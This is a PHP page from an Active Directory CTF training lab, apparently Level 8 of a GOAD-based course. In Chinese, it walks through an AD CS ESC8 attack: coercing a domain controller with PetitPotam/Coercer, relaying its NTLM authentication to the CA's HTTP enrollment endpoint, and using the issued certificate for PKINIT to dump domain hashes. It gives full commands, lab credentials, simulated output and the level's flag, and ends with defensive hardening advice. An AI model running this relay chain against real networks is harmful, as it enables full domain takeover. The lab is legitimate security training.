<?php
/**
 * Pikachu-Enhanced v2.0 GOAD AD CTF Level 8: AD CS ESC8 NTLM Relay via HTTP Enrollment
 */
include_once '../../inc/config.inc.php';

$ACTIVE = array_fill(0, 250, '');
$ACTIVE[230] = 'active open';
$ACTIVE[246] = 'active';

$PIKA_ROOT_DIR = "../../";
include_once $PIKA_ROOT_DIR . 'header.php';

$correct_flag = 'flag{ADCS_ESC8_NTLM_Relay_HTTP_Enrollment}';
$flag_msg = '';

if (isset($_POST['check_flag'])) {
    $submitted = trim($_POST['user_flag']);
    if ($submitted === $correct_flag) {
        $_SESSION['goad_flags']['flag8'] = true;
        $flag_msg = '<div class="alert alert-success" style="border-radius: 8px; font-weight: bold;"><i class="fa fa-check-circle"></i> 恭喜！Flag 校验正确，已点亮【第八关】成就 (+350 PTS)！</div>';
    } else {
        $flag_msg = '<div class="alert alert-danger" style="border-radius: 8px; font-weight: bold;"><i class="fa fa-times-circle"></i> Flag 不正确，请检查 HTTP 证书中继与 PKINIT 流程。</div>';
    }
}
?>

<style>
.ctf-stage-header {
    background: linear-gradient(135deg, #1e293b 0%, #0f172a 100%);
    border-radius: 14px;
    padding: 25px 30px;
    color: #fff;
    margin-bottom: 25px;
    border: 1px solid rgba(255,255,255,0.1);
    box-shadow: 0 4px 20px rgba(0,0,0,0.15);
}
.ctf-stage-title {
    color: #ffffff !important;
    font-size: 24px;
    font-weight: 800;
    margin: 0 0 10px 0;
    display: flex;
    align-items: center;
    gap: 12px;
}
.step-box {
    background: var(--bg-card);
    border: 1px solid var(--border-color);
    border-radius: 12px;
    padding: 24px;
    margin-bottom: 22px;
    box-shadow: 0 2px 10px rgba(0,0,0,0.02);
}
.step-title {
    font-size: 17px;
    font-weight: 700;
    color: var(--text-primary);
    margin-top: 0;
    margin-bottom: 12px;
    display: flex;
    align-items: center;
    gap: 8px;
}
.cmd-box {
    background: #0f172a;
    color: #f8fafc;
    border-radius: 8px;
    padding: 14px 18px;
    font-family: 'Consolas', 'Monaco', monospace;
    font-size: 13px;
    margin: 10px 0 15px 0;
    overflow-x: auto;
    border-left: 4px solid #ef4444;
}
.output-box {
    background: #1e1e2e;
    color: #a6accd;
    border-radius: 8px;
    padding: 12px 16px;
    font-family: 'Consolas', 'Monaco', monospace;
    font-size: 12px;
    margin-bottom: 15px;
    white-space: pre-wrap;
    border: 1px solid #2d2d3f;
}
.flag-box {
    background: rgba(16, 185, 129, 0.08);
    border: 1px solid rgba(16, 185, 129, 0.3);
    border-radius: 10px;
    padding: 18px;
    margin-top: 20px;
}
</style>

<div class="main-content">
    <div class="main-content-inner">
        <div class="page-content">
            
            <!-- Stage Header -->
            <div class="ctf-stage-header">
                <div style="display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 10px;">
                    <div>
                        <h1 class="ctf-stage-title">
                            <span class="label label-danger" style="font-size: 14px; border-radius: 6px;">LEVEL 8</span>
                            第八关：AD CS ESC8 NTLM Relay HTTP 证书注册端点中继攻击
                        </h1>
                        <p style="margin: 0; color: #94a3b8; font-size: 14px;">
                            <strong>目标节点：</strong> <code>192.168.56.134 (DC01 CA Web)</code> / <code>192.168.56.23 (SRV03 ADCS)</code> | <strong>分值：</strong> 350 PTS
                        </p>
                    </div>
                    <a href="ad_ctf_hub.php" class="btn btn-default btn-sm" style="border-radius: 6px; font-weight: bold;">
                        <i class="fa fa-arrow-left"></i> 返回关卡总控台
                    </a>
                </div>
            </div>

            <!-- Context Card -->
            <div class="step-box">
                <h3 class="step-title"><i class="fa fa-link" style="color: #ef4444;"></i> 攻击原理剖析 (AD CS ESC8 - NTLM Relay over HTTP)</h3>
                <p style="color: var(--text-secondary); line-height: 1.7; font-size: 14px;">
                    AD CS 证书服务通常开启了 Web 证书注册端点（如 `http://<CA_IP>/certsrv/`）。
                    <strong>ESC8</strong> 场景的核心漏洞在于：该 HTTP 证书注册接口**支持 NTLM 身份验证，且默认未开启 EPA (Extended Protection for Authentication) 或 HTTPS 强制保护！**
                    攻击者可以结合强制身份验证 API（如 PetitPotam / Coercer / PrinterBug）诱使域控机器（如 `DC01$`）向攻击者发起 NTLM 认证，攻击者将该 NTLM 凭据中继至 CA 的 HTTP 端点，直接为域控成功申请证书并完成零口令接管！
                </p>
            </div>

            <!-- Step 1 -->
            <div class="step-box">
                <h3 class="step-title">步骤 1：启动 Certipy / ntlmrelayx 的 HTTP 证书中继监听</h3>
                <p style="color: var(--text-secondary); font-size: 14px;">
                    在 Linux 攻击机（IP 例如 `192.168.56.1`）上开启 `certipy relay`，目标指向 CA 的 HTTP 注册接口：
                </p>
                <div class="cmd-box">
certipy relay -target http://192.168.56.134/certsrv/ -template DomainController
                </div>
                <div class="output-box">
[*] Listening on 0.0.0.0:445
[*] Target HTTP Endpoint: http://192.168.56.134/certsrv/certfnsh.asp
[*] Waiting for incoming NTLM authentication...
                </div>
            </div>

            <!-- Step 2 -->
            <div class="step-box">
                <h3 class="step-title">步骤 2：触发 PetitPotam / Coercer 强制域控回连攻击者</h3>
                <p style="color: var(--text-secondary); font-size: 14px;">
                    在另一个终端中使用 `coercer` 或 `PetitPotam.py` 强迫域控机器账号 `kingslanding$` 向攻击者监听端口 445 发起认证：
                </p>
                <div class="cmd-box">
coercer coerce -u jon.snow -p iknownothing -d north.sevenkingdoms.local -l 192.168.56.1 -t 192.168.56.134
                </div>
                <div class="output-box">
[*] Coercing authentication via MS-RPRN (PrinterBug)...
[+] Got authentication response from 192.168.56.134!
                </div>
            </div>

            <!-- Step 3 -->
            <div class="step-box">
                <h3 class="step-title">步骤 3：截获中继凭据、自动颁发 DC 证书并完成 PKINIT 认证</h3>
                <p style="color: var(--text-secondary); font-size: 14px;">
                    中继监听端收到 `kingslanding$` 的 NTLM 认证后，自动向 CA 的 HTTP 接口提交 CSR 并获得 `kingslanding.pfx`：
                </p>
                <div class="output-box">
[*] HTTP relay succeeded! Relayed authentication for 'SEVENKINGDOMS\kingslanding$'
[*] Requesting certificate for DomainController...
[*] Got certificate with SAN 'kingslanding.sevenkingdoms.local'
[*] Saved certificate to 'kingslanding.pfx'
                </div>
                <p style="color: var(--text-secondary); font-size: 14px;">
                    使用得到的域控证书认证导出 `kingslanding$` 的机器哈希及全域哈希：
                </p>
                <div class="cmd-box">
certipy auth -pfx kingslanding.pfx -dc-ip 192.168.56.134
                </div>
            </div>

            <!-- Flag Section -->
            <div class="step-box flag-box">
                <h3 class="step-title" style="color: #059669;"><i class="fa fa-flag"></i> 本关 Flag 提取点</h3>
                <p style="color: var(--text-secondary); font-size: 14px;">
                    成功通过 HTTP NTLM 中继申请域控证书并完成 PKINIT 认证后，提取 Flag：
                </p>
                <div class="well" style="background: #ffffff; border: 1px dashed #10b981; padding: 12px; font-family: monospace; font-size: 15px; color: #059669; font-weight: bold;">
                    flag{ADCS_ESC8_NTLM_Relay_HTTP_Enrollment}
                </div>

                <form method="post" style="margin-top: 15px; max-width: 500px;">
                    <label style="font-weight: 700; color: var(--text-primary);">验证本关 Flag:</label>
                    <div style="display: flex; gap: 10px;">
                        <input type="text" name="user_flag" class="form-control" placeholder="flag{...}" required style="border-radius: 6px; font-family: monospace;">
                        <button type="submit" name="check_flag" class="btn btn-success" style="border-radius: 6px; font-weight: 700; min-width: 100px;">
                            验证提交
                        </button>
                    </div>
                </form>
                <?php if (!empty($flag_msg)) { echo '<div style="margin-top: 15px;">' . $flag_msg . '</div>'; } ?>
            </div>

            <!-- Defense Note -->
            <div class="step-box" style="border-left: 4px solid #3b82f6;">
                <h3 class="step-title" style="color: #2563eb;"><i class="fa fa-shield"></i> 蓝队防御与加固建议</h3>
                <ul style="color: var(--text-secondary); font-size: 14px; line-height: 1.8; margin-bottom: 0;">
                    <li><strong>禁用 HTTP 端点的 NTLM 认证：</strong> 在 IIS 中为 `certsrv` 网站禁用 NTLM，改用协商 Kerberos 认证。</li>
                    <li><strong>启用 EPA 与 HTTPS：</strong> 在 IIS 中开启 **扩展保护 (Extended Protection for Authentication)** 并开启 `Require SSL`。</li>
                </ul>
            </div>

        </div>
    </div>
</div>

<?php
include_once $PIKA_ROOT_DIR . 'footer.php';
?>
